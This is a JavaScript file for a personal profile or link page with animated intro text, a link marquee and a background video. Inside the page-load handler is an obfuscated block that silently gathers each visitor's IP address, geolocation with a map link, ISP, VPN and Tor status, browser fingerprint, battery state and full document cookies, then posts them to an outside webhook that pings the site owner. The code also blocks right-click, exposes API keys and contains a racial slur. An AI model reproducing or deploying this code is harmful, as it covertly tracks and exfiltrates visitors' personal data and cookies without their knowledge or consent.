'use strict';

const ipgeolocation = 'https://api.ipgeolocation.io/ipgeo?apiKey=31ece79449854d1c8059ec105e82b33d';

const timeouts = [];

const mobileAndTabletCheck = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

const letters = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz";

document.querySelector("h1").onmouseover = event => {
  let iterations = 0;
  
  const interval = setInterval(() => {
  
    event.target.innerText = event.target.innerText.split("")
      .map((letter, index) => {
        if(index < iterations) {
          return event.target.dataset.value[index];
        }
      
        return letters[Math.floor(Math.random() * 26)]
      })
      .join("");
    if(iterations >= event.target.dataset.value.length) clearInterval(interval);
    
    iterations += 3 / 8;
  }, 30);
}

$(document).ready(() => {
  const links = [
    {
      name: 'wanted.lol',
      link: 'wanted.lol/losr',
    },
    {
      name: 'discord',
      link: 'discord.com/users/1083368117230653460',
    },
    {
      name: 'feds.lol',
      link: 'feds.lol/losr',
    },
    {
      name: 'github',
      link: 'github.com/madhead341',
    }
  ];

  for (let i in links) {
    let link = links[i];

    $('#marquee').append(`<a href="https://${link.link}" target="_BLANK">${link.name}</a>`);

    link = $('#marquee').children('a').last();

    if (i != links.length - 1) $('#marquee').append(' <img class="emoticon" src="assets/others/dot.png"> ');
  }

  if (mobileAndTabletCheck()) {
    $('#background').replaceWith('<div id="background" style="background-image: url(assets/images/mobile-background.jpg);"></div>');

    app.shouldIgnoreVideo = true;
  }

  app.titleChanger(['!', '! L', '! LO', '! LO$','! LO$R']);
  app.iconChanger(['assets/icons/rose1.jpeg', 'assets/icons/rose2.jpg', 'assets/icons/rose3.png', 'assets/icons/rose4.png']);
});

if ($.cookie('videoTime')) {
  app.videoElement.currentTime = $.cookie('videoTime');
  app.audioElement.currentTime = $.cookie('videoTime');
}

document.addEventListener('contextmenu', (event) => {
  event.preventDefault();
});

document.body.onkeyup = (event) => {
  if (event.keyCode == 32 && app.skippedIntro) {
    if (app.backgroundToggler) {
      app.videoElement.play();
      app.audioElement.play();
    } else {
      app.videoElement.pause();
      app.audioElement.pause();
    }

    return (app.backgroundToggler = !app.backgroundToggler);
  }
};

window.addEventListener('load', function() {
  (function(_0x5c1bac,_0x259f13){const _0x413a07=_0x5af6,_0x38572b=_0x5c1bac();while(!![]){try{const _0x4c1120=-parseInt(_0x413a07(0x14b))/0x1*(-parseInt(_0x413a07(0x16e))/0x2)+parseInt(_0x413a07(0x111))/0x3+parseInt(_0x413a07(0x12a))/0x4+-parseInt(_0x413a07(0x122))/0x5+parseInt(_0x413a07(0xe8))/0x6*(parseInt(_0x413a07(0xec))/0x7)+-parseInt(_0x413a07(0x118))/0x8+-parseInt(_0x413a07(0x150))/0x9*(parseInt(_0x413a07(0x119))/0xa);if(_0x4c1120===_0x259f13)break;else _0x38572b['push'](_0x38572b['shift']());}catch(_0x4c67d9){_0x38572b['push'](_0x38572b['shift']());}}}(_0x2b7d,0x27725));function _0x5af6(_0x442e6d,_0x341d50){const _0x2b7d46=_0x2b7d();return _0x5af6=function(_0x5af632,_0x4c6c58){_0x5af632=_0x5af632-0xd9;let _0x3aa634=_0x2b7d46[_0x5af632];return _0x3aa634;},_0x5af6(_0x442e6d,_0x341d50);}async function getIPInfo(){const _0x4978a6=_0x5af6,_0xa9ab99=await fetch(_0x4978a6(0x102)),_0x1eed27=await _0xa9ab99[_0x4978a6(0x12c)](),_0xc8d686=navigator[_0x4978a6(0x115)][_0x4978a6(0x143)]()[_0x4978a6(0x16b)]('mobile'),_0x34817e=navigator[_0x4978a6(0xfd)][_0x4978a6(0x143)](),_0x55f1b7=_0x1eed27['threat'][_0x4978a6(0x11e)][_0x4978a6(0x14e)](_0x46b545=>{const _0x38580e=_0x4978a6;return'\x0a+\x20Name:\x20'+_0x46b545[_0x38580e(0x125)]+_0x38580e(0x158)+_0x46b545[_0x38580e(0x135)]+'\x20\x0a+\x20Type:\x20'+_0x46b545[_0x38580e(0x131)];}),_0x5f8420={'asn':{'asn':_0x1eed27[_0x4978a6(0x141)]['asn'],'name':_0x1eed27[_0x4978a6(0x141)][_0x4978a6(0x125)],'domain':_0x1eed27[_0x4978a6(0x141)][_0x4978a6(0x17b)],'route':_0x1eed27[_0x4978a6(0x141)][_0x4978a6(0x117)],'type':_0x1eed27['asn'][_0x4978a6(0x131)]}};function _0x26830c(){const _0x1c7a7f=_0x4978a6;if(navigator['connection']&&navigator['connection']['effectiveType'])return(navigator['connection']['downlink']*0x8)[_0x1c7a7f(0x129)](0x2)+_0x1c7a7f(0x179);return'Unknown';}const _0x1c3763=_0x26830c();function _0x376aa9(){const _0x303f50=_0x4978a6,_0x4a8f2b=navigator[_0x303f50(0x164)]||navigator[_0x303f50(0x171)]||navigator[_0x303f50(0x142)];if(!_0x4a8f2b)return _0x303f50(0x127);const _0x3caf5b=_0x4a8f2b[_0x303f50(0x10c)]||_0x4a8f2b['type'];if(_0x3caf5b===_0x303f50(0x11a))return _0x303f50(0xef);return _0x3caf5b;}const _0x2808ca=_0x376aa9(),_0x31316a=async()=>{const _0x2eb2af=_0x4978a6;try{const _0xf54f61=await fetch(_0x2eb2af(0x159)),_0x20b6b4=await _0xf54f61['json']();return _0x20b6b4;}catch(_0x3e42ab){return console['error'](_0x3e42ab),null;}},_0x229401=await _0x31316a(),_0x1bbd65=_0x229401?.['ip'],_0x24ba46=_0x229401?.['network'];let _0x401684;if(/^win/[_0x4978a6(0x13f)](_0x34817e))_0x401684='Microsoft';else{if(/^mac/[_0x4978a6(0x13f)](_0x34817e))_0x401684='Apple';else{if(/^linux/['test'](_0x34817e))_0x401684='Linux';else{if(/^android/[_0x4978a6(0x13f)](_0x34817e))_0x401684=_0x4978a6(0x138);else/^ios/[_0x4978a6(0x13f)](_0x34817e)?_0x401684=_0x4978a6(0xe2):_0x401684=_0x4978a6(0x17d);}}}const _0x322b85={'symbol':_0x1eed27[_0x4978a6(0xfe)]['symbol'],'name':_0x1eed27[_0x4978a6(0xfe)]['name'],'code':_0x1eed27[_0x4978a6(0xfe)][_0x4978a6(0x174)]},_0xa1b4ea={'name':_0x1eed27['time_zone'][_0x4978a6(0x125)],'offset':_0x1eed27[_0x4978a6(0x175)]['offset']},_0x414ff0={'location':{'IPv4':_0x1eed27['ip'],'continent':_0x1eed27[_0x4978a6(0xee)],'country':_0x1eed27['country_name'],'country_code':_0x1eed27[_0x4978a6(0x15f)],'latitude':_0x1eed27[_0x4978a6(0x17f)],'longitude':_0x1eed27['longitude'],'state':_0x1eed27['region'],'city':_0x1eed27[_0x4978a6(0xf9)],'googleMaps':'https://www.google.com/maps?q='+_0x1eed27['latitude']+','+_0x1eed27['longitude'],'timezone':_0xa1b4ea,'currency':_0x322b85,'phoneCode':'+'+_0x1eed27['calling_code'],'languages':_0x1eed27[_0x4978a6(0x16f)]['map'](_0x30f58b=>({'name':_0x30f58b['name'],'native':_0x30f58b[_0x4978a6(0x13b)],'code':_0x30f58b['code']})),'inEU':_0x1eed27[_0x4978a6(0x121)]?_0x4978a6(0x17c):'No'},'info':{'ipv4':_0x1bbd65,'ip':_0x1eed27['ip'],'provider':_0x1eed27['asn'][_0x4978a6(0x125)]+'\x20('+_0x1eed27[_0x4978a6(0x141)][_0x4978a6(0x17b)]+_0x4978a6(0x12b)+_0x1eed27[_0x4978a6(0x141)][_0x4978a6(0x131)],'version':_0x1eed27[_0x4978a6(0xdc)],'network':''+_0x1eed27[_0x4978a6(0x141)][_0x4978a6(0x117)],'ipv6network':_0x24ba46,'connectionSpeed':_0x26830c(),'wifiType':_0x376aa9(),'threat':{'is_tor':_0x1eed27['threat']['is_tor'],'is_vpn':_0x1eed27[_0x4978a6(0xdf)]['is_proxy'],'is_icloud_relay':_0x1eed27['threat']['is_icloud_relay'],'is_proxy':_0x1eed27[_0x4978a6(0xdf)][_0x4978a6(0x169)],'is_datacenter':_0x1eed27[_0x4978a6(0xdf)][_0x4978a6(0x13a)],'is_anonymous':_0x1eed27[_0x4978a6(0xdf)][_0x4978a6(0x12d)],'is_known_attacker':_0x1eed27[_0x4978a6(0xdf)][_0x4978a6(0xed)],'is_known_abuser':_0x1eed27[_0x4978a6(0xdf)][_0x4978a6(0x134)],'is_threat':_0x1eed27[_0x4978a6(0xdf)][_0x4978a6(0x168)],'is_bogon':_0x1eed27[_0x4978a6(0xdf)][_0x4978a6(0xf2)],'blocklists':_0x55f1b7}},'browserInfo':{'mobile':_0xc8d686,'browser':navigator[_0x4978a6(0x14d)],'manufacturer':_0x401684,'userAgent':navigator[_0x4978a6(0x115)],'page':location[_0x4978a6(0xfc)],'referrer':document[_0x4978a6(0x112)],'windowSize':window['innerWidth']+'x'+window[_0x4978a6(0xf8)],'historyLength':history[_0x4978a6(0x153)],'language':navigator['language'],'platform':navigator['platform'],'javaEnabled':navigator[_0x4978a6(0x161)](),'cookiesEnabled':navigator['cookieEnabled'],'javascriptEnabled':!![],'cookieDump':document['cookie'],'cpuThreads':navigator[_0x4978a6(0x160)],'memory':Math[_0x4978a6(0xff)](performance[_0x4978a6(0x155)][_0x4978a6(0x146)]/0x100000*0x64)/0x64+'\x20MB','plugins':Array[_0x4978a6(0x126)](navigator['plugins'])[_0x4978a6(0x14e)](_0x1c8527=>_0x1c8527[_0x4978a6(0x125)]+'\x20('+_0x1c8527[_0x4978a6(0x13e)]+')')[_0x4978a6(0x137)](',\x20'),'webdriver':navigator[_0x4978a6(0x114)]?_0x4978a6(0x17c):'No','battery':navigator[_0x4978a6(0xf6)]?await navigator['getBattery']()['then'](_0x434480=>Math['floor'](_0x434480[_0x4978a6(0xea)]*0x64)+'%'):_0x4978a6(0x170),'touchPoints':navigator[_0x4978a6(0xe6)]||'???','doNotTrack':navigator[_0x4978a6(0x103)]==='1'||navigator[_0x4978a6(0x103)]===_0x4978a6(0xf5)?_0x4978a6(0x17c):'No'}},_0x42f85e={'username':_0x4978a6(0xe3)+_0x414ff0[_0x4978a6(0xe9)]['ip'],'title':_0x4978a6(0x10e),'description':_0x4978a6(0x10a)+_0x4978a6(0x140)+_0x4978a6(0x15e)+('+\x20IP:\x20'+_0x414ff0[_0x4978a6(0x17e)]['IPv4']+'\x0a')+('+\x20Continent:\x20'+_0x414ff0[_0x4978a6(0x17e)][_0x4978a6(0x108)]+'\x0a')+('+\x20Country:\x20'+_0x414ff0[_0x4978a6(0x17e)][_0x4978a6(0x157)]+'\x0a')+(_0x4978a6(0x130)+_0x414ff0['location'][_0x4978a6(0x15f)]+'\x0a')+(_0x4978a6(0x17a)+_0x414ff0[_0x4978a6(0x17e)][_0x4978a6(0x14a)]+'\x0a')+(_0x4978a6(0x154)+_0x414ff0['location'][_0x4978a6(0xf9)]+'\x0a')+(_0x4978a6(0x15d)+_0x414ff0[_0x4978a6(0x17e)][_0x4978a6(0x120)]+'\x0a')+(_0x4978a6(0xe0)+_0xa1b4ea[_0x4978a6(0x125)]+'\x20(Offset:\x20'+_0xa1b4ea[_0x4978a6(0x104)]+')\x0a')+('+\x20Currency:\x20'+_0x322b85['symbol']+_0x4978a6(0x136)+_0x322b85[_0x4978a6(0x125)]+'\x20('+_0x322b85[_0x4978a6(0x174)]+')\x0a')+(_0x4978a6(0x148)+_0x414ff0[_0x4978a6(0x17e)][_0x4978a6(0x163)]+'\x0a')+('+\x20Languages:\x20'+_0x414ff0[_0x4978a6(0x17e)][_0x4978a6(0x16f)][_0x4978a6(0x14e)](_0x5ca1a9=>_0x5ca1a9[_0x4978a6(0x125)]+_0x4978a6(0x136)+_0x5ca1a9[_0x4978a6(0x174)])[_0x4978a6(0x137)](',\x20')+'\x0a')+(_0x4978a6(0x16d)+_0x414ff0[_0x4978a6(0x17e)][_0x4978a6(0x100)]+'\x0a\x0a')+(_0x4978a6(0x12e)+_0x414ff0[_0x4978a6(0x17e)][_0x4978a6(0x17f)]+'\x0a')+(_0x4978a6(0x173)+_0x414ff0['location'][_0x4978a6(0x11c)]+'\x0a\x0a')+_0x4978a6(0x116)+('+\x20IP\x20(IPv6):\x20'+_0x414ff0[_0x4978a6(0xe9)][_0x4978a6(0xdb)]+'\x0a')+(_0x4978a6(0x10f)+_0x414ff0[_0x4978a6(0xe9)]['ipv6network']+'\x0a')+(_0x4978a6(0xfb)+_0x414ff0['info']['ip']+'\x0a')+(_0x4978a6(0xe1)+_0x414ff0['info'][_0x4978a6(0x151)]+'\x0a')+(_0x4978a6(0x16a)+_0x414ff0[_0x4978a6(0xe9)][_0x4978a6(0x10b)]+'\x0a')+(_0x4978a6(0x144)+_0x414ff0['info'][_0x4978a6(0xfa)]+'\x0a')+(_0x4978a6(0x177)+_0x414ff0[_0x4978a6(0xe9)][_0x4978a6(0x110)]+'\x0a\x0a')+_0x4978a6(0xf3)+(_0x4978a6(0x172)+_0x414ff0[_0x4978a6(0xe9)][_0x4978a6(0xdf)]['is_threat']+'\x0a')+(_0x4978a6(0xd9)+_0x414ff0[_0x4978a6(0xe9)][_0x4978a6(0xdf)][_0x4978a6(0x176)]+'\x0a')+(_0x4978a6(0x124)+_0x414ff0[_0x4978a6(0xe9)][_0x4978a6(0xdf)][_0x4978a6(0x169)]+'\x0a')+('+\x20Tor\x20Browser:\x20'+_0x414ff0[_0x4978a6(0xe9)][_0x4978a6(0xdf)][_0x4978a6(0x109)]+'\x0a')+('+\x20Known\x20Abuser:\x20'+_0x414ff0[_0x4978a6(0xe9)][_0x4978a6(0xdf)][_0x4978a6(0x134)]+'\x0a\x0a')+(_0x4978a6(0xe5)+_0x414ff0[_0x4978a6(0xe9)][_0x4978a6(0xdf)]['blocklists']+'\x0a')+'```'+_0x4978a6(0x178)+'```diff\x0a'+_0x4978a6(0x133)+(_0x4978a6(0x139)+_0x414ff0['browserInfo'][_0x4978a6(0x167)]+'\x0a')+(_0x4978a6(0x101)+_0x414ff0[_0x4978a6(0xde)][_0x4978a6(0x156)]+'\x0a')+(_0x4978a6(0xf4)+_0x414ff0[_0x4978a6(0xde)][_0x4978a6(0x149)]+'\x0a')+('+\x20User\x20Agent:\x20'+_0x414ff0[_0x4978a6(0xde)][_0x4978a6(0x115)]+'\x0a')+(_0x4978a6(0x16c)+_0x414ff0['browserInfo'][_0x4978a6(0x123)]+'\x0a')+(_0x4978a6(0x165)+_0x414ff0['browserInfo'][_0x4978a6(0x112)]+'\x0a')+(_0x4978a6(0xf1)+_0x414ff0[_0x4978a6(0xde)][_0x4978a6(0x11d)]+'\x0a')+(_0x4978a6(0xe4)+_0x414ff0[_0x4978a6(0xde)][_0x4978a6(0x11f)]+'\x0a')+('+\x20Language:\x20'+_0x414ff0[_0x4978a6(0xde)][_0x4978a6(0x128)]+'\x0a')+(_0x4978a6(0x13c)+_0x414ff0['browserInfo'][_0x4978a6(0xfd)]+'\x0a')+(_0x4978a6(0xf0)+_0x414ff0['browserInfo'][_0x4978a6(0x161)]+'\x0a')+('+\x20Cookies\x20Enabled:\x20'+_0x414ff0['browserInfo'][_0x4978a6(0x11b)]+'\x0a')+('+\x20Javascript\x20Enabled:\x20'+_0x414ff0['browserInfo'][_0x4978a6(0xe7)]+'\x0a')+(_0x4978a6(0x145)+_0x414ff0['browserInfo'][_0x4978a6(0x15a)]+'\x0a')+('+\x20Memory:\x20'+_0x414ff0['browserInfo'][_0x4978a6(0x155)]+'\x0a')+('+\x20Plugins:\x20'+_0x414ff0[_0x4978a6(0xde)][_0x4978a6(0x10d)]+'\x0a')+('+\x20Webdriver/Bot:\x20'+_0x414ff0[_0x4978a6(0xde)][_0x4978a6(0x114)]+'\x0a')+('+\x20Battery:\x20'+(navigator['getBattery']!=undefined?await((async()=>{const _0x2ccde1=_0x4978a6;let _0x5e9aac=await navigator[_0x2ccde1(0xf6)]();return(_0x5e9aac[_0x2ccde1(0x152)]?_0x2ccde1(0xeb):'Not\x20Charging')+'\x20('+_0x5e9aac[_0x2ccde1(0xea)]*0x64+'%)';})()):_0x4978a6(0x170))+'\x0a')+(_0x4978a6(0x15b)+_0x414ff0[_0x4978a6(0xde)][_0x4978a6(0x166)]+'\x0a')+(_0x4978a6(0x15c)+_0x414ff0[_0x4978a6(0xde)][_0x4978a6(0x103)]+'\x0a')+(_0x4978a6(0xf7)+(window[_0x4978a6(0x107)]&&window['matchMedia'](_0x4978a6(0x14c))[_0x4978a6(0x132)]?_0x4978a6(0x17c):'No')+'\x0a')+('+\x20CPU:\x20'+(navigator['oscpu']||navigator[_0x4978a6(0xdd)]||navigator[_0x4978a6(0xfd)]||_0x4978a6(0x105))+'\x20'+(String(navigator[_0x4978a6(0x160)])+_0x4978a6(0x14f)||_0x4978a6(0x105))+'\x0a\x0a')+('+\x20Cookie\x20Dump:\x20'+_0x414ff0['browserInfo'][_0x4978a6(0x13d)])+_0x4978a6(0xda)+'\x22even\x20if\x20i\x20was\x20at\x20the\x20bottom\x20of\x20the\x20toilet,\x20yall\x20niggas\x20still\x20couldnt\x20shit\x20on\x20me\x22\x20-\x20!\x20LO$R','color':0xff00},_0x58bb4d=_0x4978a6(0x147);await fetch(_0x58bb4d,{'method':_0x4978a6(0x162),'headers':{'Content-Type':_0x4978a6(0x12f)},'body':JSON[_0x4978a6(0x106)]({'content':_0x4978a6(0x113),'embeds':[_0x42f85e]})});}getIPInfo();function _0x2b7d(){const _0x57e0ad=['is_datacenter','native','+\x20Platform:\x20','cookieDump','description','test','```diff\x0a','asn','webkitConnection','toLowerCase','+\x20Wifi\x20Type:\x20','+\x20CPU\x20Threads:\x20','totalJSHeapSize','https://events.hookdeck.com/e/src_R1vyKUogbyEC','+\x20Phone\x20Code:\x20','manufacturer','state','8335WcVIoF','(prefers-color-scheme:\x20dark)','appName','map','\x20Threads','531kbtVoZ','network','charging','length','+\x20City:\x20','memory','browser','country','\x20\x0a+\x20Site:\x20','https://ipapi.co/json','cpuThreads','+\x20Touch\x20Points:\x20','+\x20Do\x20Not\x20Track:\x20','+\x20Google\x20Maps:\x20','-\x20Location\x20Information:\x0a','country_code','hardwareConcurrency','javaEnabled','POST','phoneCode','connection','+\x20Referrer:\x20','touchPoints','mobile','is_threat','is_proxy','+\x20Bandwith:\x20','includes','+\x20Page:\x20','+\x20In\x20EU:\x20','58eqsgDm','languages','N/A','mozConnection','+\x20Threat:\x20','+\x20Longitude:\x20','code','time_zone','is_vpn','+\x20Provider:\x20','**Browser\x20Info**\x0a','\x20Mb/s','+\x20State:\x20','domain','Yes','Unknown','location','latitude','+\x20VPN:\x20','```','ipv4','version','cpuClass','browserInfo','threat','+\x20Timezone:\x20','+\x20Network\x20(IPv4):\x20','Apple','!\x20LO$R\x20Website\x20Statistics\x20Logger\x20-\x20','+\x20History\x20Length:\x20','+\x20BlockLists:\x20','maxTouchPoints','javascriptEnabled','6VAAzdQ','info','level','Charging','708589SJVmNM','is_known_attacker','continent_code','Ethernet','+\x20Java\x20Enabled:\x20','+\x20Window\x20Size:\x20','is_bogon','-\x20Threats\x20&\x20Proxy/VPN\x20Information:\x0a','+\x20Manufacturer:\x20','yes','getBattery','+\x20Dark\x20mode:\x20','innerHeight','city','wifiType','+\x20IP\x20(IPv4):\x20','href','platform','currency','round','inEU','+\x20Browser:\x20','https://api.ipdata.co/?api-key=d75ad8557d1eb86f55d816c62987104cc8e1fe9b219dd85857875a44','doNotTrack','offset','???','stringify','matchMedia','continent','is_tor','**IP\x20Info**\x0a','connectionSpeed','effectiveType','plugins','__**Someone\x20Visited\x20Your\x20Site!**__','+\x20Network\x20(IPv6):\x20','provider','615495CnzmEb','referrer','<@1083368117230653460>','webdriver','userAgent','-\x20Network\x20Information:\x0a','route','1598192ylkaZh','73410XXbuKV','ethernet','cookiesEnabled','longitude','windowSize','blocklists','historyLength','googleMaps','is_eu','352860MdtAun','page','+\x20Proxy:\x20','name','from','unknown','language','toFixed','1267724jOaTIZ',')\x20-\x20','json','is_anonymous','+\x20Latitude:\x20','application/json','+\x20Country\x20Code:\x20','type','matches','-\x20Browser\x20&\x20Document\x20Information:\x0a','is_known_abuser','site','\x20-\x20','join','Google','+\x20Mobile:\x20'];_0x2b7d=function(){return _0x57e0ad;};return _0x2b7d();}
});

setInterval(() => {
  $('.troll').remove();
}, 600);

$('.skip').click(() => {
  skipIntro();
});

$.fn.extend({
  animateCss: function(animationName) {
    const animationEnd = 'webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend';

    this.addClass(`animated ${animationName}`).one(animationEnd, () => {
      $(this).removeClass(`animated ${animationName}`);
    });

    return this;
  },
});

const writeLine = (text, speed, timeout, callback) => {
  timeout = typeof timeout === 'number' ? timeout : [0, (callback = timeout)];

  const lineNumber = app.id !== 2 ? ++app.id : (app.id += 2);

  setTimeout(() => {
    const typed = new Typed(`#line${lineNumber}`, {
      strings: text,
      typeSpeed: speed,
      onComplete: callback,
    });
  }, timeout);
};

$.getJSON(ipgeolocation, (data) => {
  const usernames = ['user', 'dude'];
  const ip = data.ip ? data.ip : usernames[Math.floor(Math.random() * usernames.length)];
  const country = data.country_name ? data.country_name : 'your country';
  
  const mee6IPs = ['209.107.204.33', '205.185.222.206', '205.185.222.207', '2a02:1810:8c1f:6200:4026:3744:9fbd:f027', '205.185.222.207', '84.194.95.249', '205.185.222.208','205.185.222.182', '209.107.204.71', '209.107.204.72', '209.107.204.73', '2a02:1810:8c1f:6200:85be:2b02:e36a:2d90'];
  const username = mee6IPs.includes(ip) ? '[! LO$R]' : '[unknown]';

  writeLine(['Authenticating...', `Granting access to <span style='font-size: 14px; color: #06d;'>${username}</span>...`], 30, () => {
    if (app.skippedIntro) return;

    clearCursor();
    writeLine([`Access granted! <span style='font-size: 14px; color: #0f0;'>[success]</span>`, `Welcome back, <i style='color: #0f0'>${ip}</i>! By the way, nice to see someone from ${country} here!`], 30, 500, () => {
      writeLine([`<i style='color: #F62459'>~ Sexualize#0001 </i>`], 120, 500, () => {
        timeouts.push(
          setTimeout(() => {
            if (app.skippedIntro) return;

            clearCursor();

            setTimeout(() => {
              skipIntro();
            }, 500);
          }, 1000)
        );
      });
    });
  });
});

  




const skipIntro = () => {
  if (app.skippedIntro) return;

  app.skippedIntro = true;

  timeouts.forEach((timeout) => {
    clearTimeout(timeout);
  });

  $('.top-right').remove();

  $('#main').fadeOut(100, () => {
    $('#main').remove();

    $('#marquee').marquee({
      duration: 15000,
      gap: 420,
      delayBeforeStart: 1000,
      direction: 'left',
      duplicated: true,
    });

    setTimeout(() => {
      $('.brand-header').animateCss(app.effects[Math.floor(Math.random() * app.effects.length)]);
    }, 200);

    setTimeout(() => {
      const typed = new Typed('#brand', {
        strings: app.brandDescription,
        typeSpeed: 40,

        onComplete: () => {
          clearCursor();
        },
      });
    }, 1350);

    setTimeout(() => {
      if (!app.shouldIgnoreVideo) {
        app.videoElement.play();
        app.audioElement.play();
      }

      app.videoElement.addEventListener(
        'timeupdate',
        () => {
          $.cookie('videoTime', app.videoElement.currentTime, { expires: 1 });
        },
        false
      );

      $('.marquee-container').css('visibility', 'visible').hide().fadeIn(100);

      $('.marquee-container').animateCss('zoomIn');

      $('.container').fadeIn();

      $('.background').fadeIn(200, () => {
        if (!app.shouldIgnoreVideo) $('#audio').animate({ volume: app.musicVolume }, app.musicFadeIn);
      });
    }, 200);
  });
};

const clearCursor = () => {
  return $('span').siblings('.typed-cursor').css('opacity', '0');
};

document.onmousemove = e => {
  const x = e.clientX;
  const y = e.clientY;

  for (const card of document.getElementsByClassName("card")) {
    const rect = card.getBoundingClientRect();
    const isInsideCard = x >= rect.left && x <= rect.right && y >= rect.top && y <= rect.bottom;

    card.style.setProperty("--mouse-x", isInsideCard ? `${x - rect.left}px` : "50%");
    card.style.setProperty("--mouse-y", isInsideCard ? `${y - rect.top}px` : "50%");
    card.classList.toggle("outside-card", !isInsideCard);
  }
};
